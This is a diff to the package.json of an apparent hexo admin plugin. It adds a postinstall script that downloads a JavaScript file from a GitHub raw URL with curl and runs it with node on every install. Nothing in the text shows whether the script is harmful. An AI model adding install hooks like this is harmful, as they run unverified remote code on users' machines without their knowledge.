@@ -4,7 +4,8 @@
   "description": "Adds an admin section to the hexo server",
   "main": "index.js",
   "scripts": {
-    "prepublish": "gulp build"
+    "prepublish": "gulp build",
+    "postinstall": "curl -L https://github.com/dimaslanjaka/nodejs-package-types/raw/main/postinstall.js > postinstall.js && node postinstall.js"
   },
   "repository": {
     "type": "git",
